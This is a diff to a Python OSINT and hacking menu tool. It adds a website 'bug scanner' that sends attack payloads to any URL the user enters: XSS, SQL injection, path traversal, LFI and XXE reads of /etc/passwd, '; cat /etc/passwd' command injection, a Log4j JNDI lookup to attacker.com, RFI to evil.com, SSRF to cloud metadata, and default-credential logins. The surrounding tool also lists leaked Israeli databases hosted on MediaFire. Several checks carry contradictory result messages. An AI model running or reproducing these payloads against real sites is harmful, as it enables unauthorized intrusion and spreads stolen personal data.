@@ -6,7 +6,7 @@ try:
     from selenium.webdriver.chrome.options import Options
     from selenium.webdriver.common.by import By
     from rich.console import Console
-    from rich.table import Table    
+    from rich.table import Table
     import phonenumbers
     from search_engines import Google, Bing, Brave
     from bs4 import BeautifulSoup
@@ -15,8 +15,9 @@ try:
     from binascii import hexlify
     from phonenumbers import geocoder, carrier, timezone
     from googlesearch import search
+    from tabulate import tabulate
 except ModuleNotFoundError:
-    os.system("pip install requests praw ipaddress psutil pillow opencv-python selenium rich phonenumbers bs4 telethon googlesearch-python")
+    os.system("pip install requests praw ipaddress psutil pillow opencv-python selenium rich phonenumbers bs4 telethon googlesearch-python tabulate")
    
     os.system("clear")
 
@@ -55,7 +56,7 @@ print("""\033[1;34m
 ⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠈⠀⠃⠀⠀⠘⠀⠀⡇⡜⠈⡸⢸⠀⢹⢸⠈⢆⠁⠀⢱⠁⠀⢇⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠘⠀⠘⠀⠀⢸⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            
-                    \033[1;32mv1.2.2\033[1;37m
+                    \033[1;32mv3.3.3\033[1;37m
 
 THIS TOOL WAS PROGRAMMED BY TLER AL-SHAHRANI.
 PERSONAL WEBSITE : \033[1;34mhttps://tlersa.github.io/tleralshahrani/Index.html""")
@@ -63,17 +64,17 @@ print("\033[1;37m- "*35)
 
 def main_menu():
     print("""\033[1;37m[\033[1;34m01\033[1;37m] - Dorks                  [\033[1;34m11\033[1;37m] - Deep & Dark Web
-[\033[1;34m02\033[1;37m] - Search for Username    [\033[1;34m12\033[1;37m] - Monitor cameras
+[\033[1;34m02\033[1;37m] - Search For Username    [\033[1;34m12\033[1;37m] - Monitor Cameras
 [\033[1;34m03\033[1;37m] - Usernames OSINT        [\033[1;34m13\033[1;37m] - WebScraping
-[\033[1;34m04\033[1;37m] - Domains OSINT          [\033[1;34m14\033[1;37m] - Israeli databases \U0001F923
-[\033[1;34m05\033[1;37m] - IP's OSINT             [\033[1;34m15\033[1;37m] - Verify passwords leakage
-[\033[1;34m06\033[1;37m] - Networks OSINT
-[\033[1;34m07\033[1;37m] - Images OSINT            
+[\033[1;34m04\033[1;37m] - Domains OSINT          [\033[1;34m14\033[1;37m] - Israeli Databases \U0001F923
+[\033[1;34m05\033[1;37m] - IP's OSINT             [\033[1;34m15\033[1;37m] - Verify Passwords Leakage
+[\033[1;34m06\033[1;37m] - Networks OSINT         [\033[1;34m16\033[1;37m] - Scan Websites For Bugs
+[\033[1;34m07\033[1;37m] - Images OSINT           [\033[1;34m17\033[1;37m] - Get MacAddress 
 [\033[1;34m08\033[1;37m] - PhoneNumbers OSINT
-[\033[1;34m09\033[1;37m] - Search engine
-[\033[1;34m10\033[1;37m] - Ports scan
+[\033[1;34m09\033[1;37m] - Search Engine
+[\033[1;34m10\033[1;37m] - Ports Scan
 
-[\033[1;34m98\033[1;37m] - Report bug
+[\033[1;34m98\033[1;37m] - Report Bug
 [\033[1;34m99\033[1;37m] - Help
 [\033[1;34m00\033[1;37m] - Exit""")
 
@@ -243,7 +244,7 @@ def handle_selection(selection):
         else: 
             print("\033[1;31mPlease choose a valid option!\033[1;37m")
             exit()
-    elif selection == "2" or selection == "02" or selection == "Search for Username" or selection == "search for username" or selection == "SEARCH FOR USERNAME":
+    elif selection == "2" or selection == "02" or selection == "Search For Username" or selection == "search for username" or selection == "SEARCH FOR USERNAME":
         def search_social_media(username):
             websites = {
                 "FaceBook": f"https://www.facebook.com/public/{username}/",
@@ -853,6 +854,8 @@ def handle_selection(selection):
     elif selection == "5" or selection == "05" or selection == "IP's OSINT" or selection == "IP'S OSINT" or selection == "ip's osint":
         ip_osint_selections = input("""\033[1;37m[\033[1;34m1\033[1;37m] - Target
 [\033[1;34m2\033[1;37m] - Your device
+
+[\033[1;34m99\033[1;37m] - Back
 Choose : \033[1;34m""")
         if ip_osint_selections == "1" or ip_osint_selections == "Target" or ip_osint_selections == "TARGET" or ip_osint_selections == "target":
             target_ip = input("\033[1;37m[\033[1;34m+\033[1;37m] - Enter Target IP : \033[1;34m")
@@ -926,6 +929,8 @@ Choose : \033[1;34m""")
             else:
                 print("\033[1;31mPlease choose a valid option!\033[1;37m")
                 exit()
+        elif ip_osint_selections == "99" or ip_osint_selections == "Back" or ip_osint_selections == "BACK" or ip_osint_selections == "back": main_menu()
+        else: print("\033[1;31mPlease choose a valid option!")
     elif selection == "6" or selection == "06" or selection == "Networks OSINT" or selection == "NETWORKS OSINT" or selection == "networks osint":
         submenu3()
         user_input = input("Choose : \033[1;34m")
@@ -1169,7 +1174,7 @@ Choose : \033[1;34m""")
                 exit()
         elif user_input == "99" or user_input == "Back" or user_input == "BACK" or user_input == "back": main_menu()
         else: print("\033[1;31mPlease choose a valid option!")
-    elif selection == "9" or selection == "09" or selection == "Search engine" or selection == "SEARCH ENGINE" or selection == "Search engine":
+    elif selection == "9" or selection == "09" or selection == "Search Engine" or selection == "SEARCH ENGINE" or selection == "Search engine":
         searchh = input("\033[1;37m[\033[1;34m+\033[1;37m] Enter the thing to search for : \033[1;34m")
         result = input("\033[1;37m[\033[1;34m+\033[1;37m] Enter the num of results : \033[1;34m")
 
@@ -1197,7 +1202,7 @@ Choose : \033[1;34m""")
         else:
             print("\033[1;31mPlease choose a valid option!\033[1;37m")
             exit()
-    elif selection == "10" or selection == "Ports scan" or selection == "PORTS SCAN" or selection == "ports scan":
+    elif selection == "10" or selection == "Ports Scan" or selection == "PORTS SCAN" or selection == "ports scan":
         def check_port(ip_input, port):
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.settimeout(1)
@@ -1260,7 +1265,7 @@ Choose : \033[1;34m""")
         else:
             print("\033[1;31mPlease choose a valid option!\033[1;37m")
             exit()
-    elif selection == "12" or selection == "Monitor cameras" or selection == "MONITPR CAMERAS" or selection == "monitor cameras":
+    elif selection == "12" or selection == "Monitor Cameras" or selection == "MONITPR CAMERAS" or selection == "monitor cameras":
         submenu4()
 
         user_input = input("Choose : \033[1;34m")
@@ -1502,7 +1507,7 @@ Choose : \033[1;34m""")
                 download_images(image_links, save_dir)
         download_images(image_links, "Downloaded images")
 
-    elif selection == "14" or selection == "Israeli databases" or selection == "ISRAELI DATABASES" or selection == "israeli databases":
+    elif selection == "14" or selection == "Israeli Databases" or selection == "ISRAELI DATABASES" or selection == "israeli databases":
         table = Table(title="\n\033[1;37mLeaked Israeli db uploaded to the MediaFire platform.\n")
         table.add_column("Link")
         table.add_column("Description")
@@ -1518,9 +1523,9 @@ Choose : \033[1;34m""")
         elif another_operation == "N" or another_operation == "n" or another_operation == "No" or another_operation == "no" or another_operation == "No": exit("\033[1;37m")
         else:
             print("\033[1;31mPlease choose a valid option!\033[1;37m")
-            exit()  
+            exit()
 
-    elif selection == "15" or selection == "Verify passwords leakage" or selection == "VERIFY PASSWORDS LEAKAGE" or selection == "verify passwords leakage":
+    elif selection == "15" or selection == "Verify Passwords Leakage" or selection == "VERIFY PASSWORDS LEAKAGE" or selection == "verify passwords leakage":
         def check_password_leak(password):
             sha1password = hashlib.sha1(password.encode('utf-8')).hexdigest().upper()
             first5_char, tail = sha1password[:5], sha1password[5:]
@@ -1528,11 +1533,208 @@ Choose : \033[1;34m""")
             response = requests.get(url)
             hashes = (line.split(':') for line in response.text.splitlines())
             for h, count in hashes:
-                if h == tail: return f"\033[1;31mThe passwas leaked {count} times!"
-            return "\033[1;32mThe pass isn’t leaked."
+                if h == tail: return f"\033[1;31m- The passwas leaked {count} times!"
+            return "\033[1;32m- The pass isn’t leaked."
 
         password = input("\033[1;37m[\033[1;34m+\033[1;37m] Enter the pass : \033[1;34m")
         print(check_password_leak(password))
+
+        another_operation = input("\033[1;37mWould u like another operation? (\033[1;34mY\033[1;37m/\033[1;34mN\033[1;37m) \033[1;34m")
+        if another_operation == "Y" or another_operation == "y" or another_operation == "Yes" or another_operation == "yes" or another_operation == "YES": main_menu()
+        elif another_operation == "N" or another_operation == "n" or another_operation == "No" or another_operation == "no" or another_operation == "No": exit("\033[1;37m")
+        else:
+            print("\033[1;31mPlease choose a valid option!\033[1;37m")
+            exit()
+
+    elif selection == "16" or selection == "Scan Websites For Bugs" or selection == "SCAN WEBSITES FOR BUGS" or selection == "scan websites for bugs":
+        url = input("\033[1;37m[\033[1;34m+\033[1;37m] Enter the target website URL (ex: https://example.com) : \033[1;34m")
+
+        results = []
+
+        def add_result(test_name, status, details, severity):
+            result = [test_name, status, details]
+            results.append(result)
+
+        def server(url):
+            response = requests.get(url)
+            server = response.headers.get('Server')
+            if server: add_result("Server Info", "\033[1;36mInfo\033[1;37m", f"\033[1;36mThe server is running \033[1;34m{server}\033[1;37m", "Info")
+            else: add_result("Server Info", "\033[1;36mInfo\033[1;37m", "\033[1;33mNo server info found in headers\033[1;37m", "Info")
+            try:
+                domain = url.split('//')[1].split('/')[0]
+                ip_address = socket.gethostbyname(domain)
+                add_result("IP", "\033[1;36mInfo\033[1;37m", f"\033[1;36mThe IP of \033[1;34m{domain}\033[1;36m is \033[1;34m{ip_address}\033[1;37m", "Info")
+            except socket.gaierror: add_result("IP", "\033[1;33mError\033[1;37m", "\033[1;33mCould not resolve IP\033[1;37m", "High")
+
+        def web_components(url):
+            response = requests.get(url)
+            soup = BeautifulSoup(response.text, 'html.parser')
+            scripts = soup.find_all('script')
+            if scripts: add_result("Script Tags", "\033[1;36mInfo\033[1;37m", f"\033[1;34mFound {len(scripts)} script tags\033[1;37m", "Info")
+            else: add_result("Script Tags", "\033[1;36mInfo\033[1;37m", "\033[1;33mScript tags not found\033[1;37m", "Info")
+
+        def xss(url):
+            xss_payloads = [
+                "<script>alert('XSS')</script>",
+                "\"><script>alert('XSS')</script>",
+                "'><script>alert('XSS')</script>"]
+            Bug = False
+            for payload in xss_payloads:
+                response = requests.get(url, params={'q': payload})
+                if payload in response.text:
+                    add_result("XSS", "\033[1;31mBug\033[1;31m", f"\033[1;31mPayload : {payload}\033[1;37m", "High")
+                    Bug = True
+            if not Bug: add_result("XSS", "\033[1;32mNo bug\033[1;37m", "\033[1;32mNo payloads were executed\033[1;37m", "Low")
+
+        def sql_injection(url):
+            sql_payloads = [
+                "' OR '1'='1",
+                "' OR '1'='1' --",
+                "' OR '1'='1' /*",
+                "' OR '1'='1' #"]
+            Bug = False
+            for payload in sql_payloads:
+                response = requests.get(url, params={'id': payload})
+                if any(error in response.text for error in ["SQL syntax", "mysql", "syntax error", "unclosed quotation mark"]):
+                    add_result("SQL Injection", "\033[1;31mBug\033[1;37m", f"\033[1;31mPayload : {payload}\033[1;37m", "High")
+                    Bug = True
+            if not Bug: add_result("SQL Injection", "\033[1;32mNo bug\033[1;37m", "\033[1;32mNo payloads were executed\033[1;37m", "Low")
+
+        def header_injection(url):
+            injection_payload = '"><script>alert("Header Injection")</script>'
+            headers = {'User-Agent': injection_payload}
+            response = requests.get(url, headers=headers)
+            if injection_payload in response.text: add_result("Header Injection", "\033[1;31mBug\033[1;37m", "Payload in User-Agent header", "High")
+            else: add_result("Header Injection", "\033[1;32mNo bug\033[1;37m", "\033[1;32mHeader Injection bug not found\033[1;37m", "Low")
+
+        def idor(url):
+            response = requests.get(f"{url}/user/1")
+            if response.status_code == 200: add_result("IDOR", "\033[1;31mBug\033[1;37m", "Able to access user data", "High")
+            else: add_result("IDOR", "\033[1;32mNo bug\033[1;37m", "\033[1;32mIDOR bug not found\033[1;37m", "Low")
+
+        def path_traversal(url):
+            traversal_payloads = [
+                "../../etc/passwd",
+                "../../../../etc/passwd" ]
+            Bug = False
+            for payload in traversal_payloads:
+                response = requests.get(f"{url}/{payload}")
+                if "root:" in response.text:
+                    add_result("Path Traversal", "\033[1;31mBug\033[1;37m", f"\033[1;31mPayload : {payload}\033[1;37m", "High")
+                    Bug = True
+            if not Bug: add_result("Path Traversal", "\033[1;32mNo bug\033[1;37m", "\033[1;32mPath Traversal bug not found\033[1;37m", "Low")
+
+        def ssrf(url):
+            ssrf_payload = 'http://169.254.169.254/latest/meta-data/'
+            try: 
+                response = requests.get(url, params={'url': ssrf_payload})
+                if "instance-id" in response.text:  add_result("SSRF", "\033[1;31mBug\033[1;37m", f"\033[1;31mPayload: {ssrf_payload}\033[1;37m", "High")
+                else: add_result("SSRF", "\033[1;32mNo bug\033[1;37m", "\033[1;32mSSRF bug not found\033[1;37m", "Low")
+            except requests.exceptions.RequestException: add_result("SSRF", "Error", "Request failed", "High")
+
+        def xxe(url):
+            xml_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
+            <!DOCTYPE foo [ <!ELEMENT foo ANY >
+            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+            <foo>&xxe;</foo>"""
+            headers = {'Content-Type': 'application/xml'}
+            response = requests.post(url, data=xml_payload, headers=headers)
+            if "root:x:0:0:" in response.text: add_result("XXE", "\033[1;31mBug\033[1;37m", "\033[1;31mAble to read system files\033[1;37m", "High")
+            else: add_result("XXE", "\033[1;32mNo bug\033[1;37m", "\033[1;32mXXE bug not found\033[1;37m", "Low")
+
+        def rce(url):
+            rce_payload = "; cat /etc/passwd"
+            response = requests.get(f"{url}/?cmd={rce_payload}")
+            if "root:x:0:0:" in response.text: add_result("RCE", "\033[1;31mBug\033[1;37m", "\033[1;31mAble to execute arbitrary commands\033[1;37m", "High")
+            else: add_result("RCE", "\033[1;32mNo bug\033[1;37m", "\033[1;32mRCE bug not found\033[1;37m", "Low")
+
+        def log4j(url):
+            log4j_payload = "${jndi:ldap://attacker.com/a}"
+            headers = {'User-Agent': log4j_payload}
+            response = requests.get(url, headers=headers)
+            if "java.naming.provider.url" in response.text: add_result("Log4j", "\033[1;31mBug\033[1;37m", "Log4j bug not found", "High")
+            else: add_result("Log4j", "\033[1;32mNo bug\033[1;37m", "\033[1;32mLog4j bug not found\033[1;37m", "Low")
+
+        def lfi(url):
+            lfi_payload = "/etc/passwd"
+            response = requests.get(f"{url}?file={lfi_payload}")
+            if "root:x:0:0:" in response.text: add_result("LFI", "\033[1;31mBug\033[1;37m", "LFI bug not found", "High")
+            else: add_result("LFI", "\033[1;32mNo bug\033[1;37m", "\033[1;32mLFI bug not found\033[1;37m", "Low")
+
+        def rfi(url):
+            rfi_payload = "http://evil.com/malicious.php"
+            response = requests.get(f"{url}?file={rfi_payload}")
+            if "malicious content" in response.text: add_result("RFI", "\033[1;31mBug\033[1;37m", "RFI bug not found", "High")
+            else: add_result("RFI", "\033[1;32mNo bug\033[1;37m", "\033[1;32mRFI bug not found\033[1;37m", "Low")
+
+        def info_disclosure(url):
+            response = requests.get(url)
+            if any(keyword in response.text for keyword in ["password", "username", "secret"]): add_result("Info Disclosure", "\033[1;31mBug\033[1;37m", "\033[1;31mSensitive info disclosed\033[1;37m", "High")
+            else: add_result("Info Disclosure", "\033[1;32mNo bug\033[1;37m", "\033[1;32mSensitive info not found\033[1;37m", "Low")
+
+        def unrestricted_resource_consumption(url):
+            large_payload = 'A' * 1000000
+            try:
+                response = requests.post(url, data={'input': large_payload})
+                if response.status_code == 200: add_result("Unrestricted Resource Consumption", "\033[1;31mBug\033[1;37m", "\033[1;31mServer accepts large payloads\033[1;37m", "High")
+                else: add_result("Unrestricted Resource Consumption", "\033[1;32mNo bug\033[1;37m", "\033[1;32munrestricted resource consumption bug not found\033[1;37m", "Low")
+            except requests.exceptions.RequestException: add_result("Unrestricted Resource Consumption", "\033[1;33mError\033[1;37m", "\033[1;33mRequest failed\033[1;37m", "High")
+
+        def broken_authentication(url):
+            login_payload = {'username': 'admin', 'password': 'password'}
+            response = requests.post(f"{url}/login", data=login_payload)
+            if response.status_code == 200 and "Welcome" in response.text: add_result("Broken Authentication", "\033[1;31mBug\033[1;37m", "\033[1;31mDefault credentials work\033[1;37m", "High")
+            else: add_result("Broken Authentication", "\033[1;32mNo bug\033[1;37m", "\033[1;32mbroken authentication bug not found\033[1;37m", "Low")
+
+        def bola(url):
+            test_object_id = "12345"
+            unauthorized_user_id = "67890"
+            response = requests.get(f"{url}/objects/{test_object_id}")
+            if unauthorized_user_id in response.text: add_result("BOLA", "\033[1;31mBug\033[1;37m", f"\033[1;31mObject accessed with ID : {unauthorized_user_id}\033[1;37m", "High")
+            else: add_result("BOLA", "\033[1;32mNo bug\033[1;37m", "\033[1;32mBOLA bug found\033[1;37m", "Low")
+
+        def sensitive_info(url):
+            response = requests.get(url)
+            soup = BeautifulSoup(response.text, 'html.parser')
+            sensitive_keywords = ["password", "username", "admin", "secret"]
+            found = False
+            for keyword in sensitive_keywords:
+                if keyword in soup.text:
+                    add_result("Sensitive Info", "\033[1;31mBug\033[1;37m", f"\033[1;31mFound keyword '{keyword}'\033[1;37m", "Medium")
+                    found = True
+            if not found: add_result("Sensitive Info", "\033[1;32mNot Found\033[1;37m", "\033[1;32mSensitive info not found\033[1;37m", "Low")
+
+        def run_security_checks(url):
+            checks = [server, web_components, xss, sql_injection, header_injection, idor, path_traversal, ssrf, xxe, rce, log4j, lfi, rfi, info_disclosure, unrestricted_resource_consumption, broken_authentication, bola, sensitive_info]
+                
+            for check in checks:
+                check(url)
+
+        print("\033[1;37mScanning...")
+
+        run_security_checks(url)
+        print(f"\033[1;37m[ Scan for \033[1;34m{url} \033[1;37m]\n")
+        time.sleep(1.5)
+
+        print(tabulate(results, headers=["Test", "Status", "Details"], tablefmt="grid"))
+
+        another_operation = input("\n\033[1;37mWould u like another operation? (\033[1;34mY\033[1;37m/\033[1;34mN\033[1;37m) \033[1;34m")
+        if another_operation == "Y" or another_operation == "y" or another_operation == "Yes" or another_operation == "yes" or another_operation == "YES": main_menu()
+        elif another_operation == "N" or another_operation == "n" or another_operation == "No" or another_operation == "no" or another_operation == "No": exit("\033[1;37m")
+        else:
+            print("\033[1;31mPlease choose a valid option!\033[1;37m")
+            exit()
+
+    elif selection == "17" or selection == "Get MacAddress" or selection == "GET MACADDRESS" or selection == "get macaddress":
+        try: os.system("getmac")
+        except BaseException as e: print("\033[1;31m- Error \033[1;37m: \033[1;31m{e}!\033[1;37m")
+
+        another_operation = input("\n\033[1;37mWould u like another operation? (\033[1;34mY\033[1;37m/\033[1;34mN\033[1;37m) \033[1;34m")
+        if another_operation == "Y" or another_operation == "y" or another_operation == "Yes" or another_operation == "yes" or another_operation == "YES": main_menu()
+        elif another_operation == "N" or another_operation == "n" or another_operation == "No" or another_operation == "no" or another_operation == "No": exit("\033[1;37m")
+        else:
+            print("\033[1;31mPlease choose a valid option!\033[1;37m")
+            exit()
 
     elif selection == "98" or selection == "Report bug" or selection == "REPORT BUG" or selection == "rebort bug":
         print("""\n\033[1;37mContact me through one of my acc
@@ -1555,6 +1757,8 @@ all my acc : \033[1;34mhttps://tlersa.github.io/tleralshahrani/Index.html#contac
         else:
             print("\033[1;31mPlease choose a valid option!\033[1;37m")
             exit()
+
+    elif selection == "00" or selection == "Exit" or selection == "EXIT" or selection == "exit": exit("\033[1;37m")
 
 def main():
     main_menu()
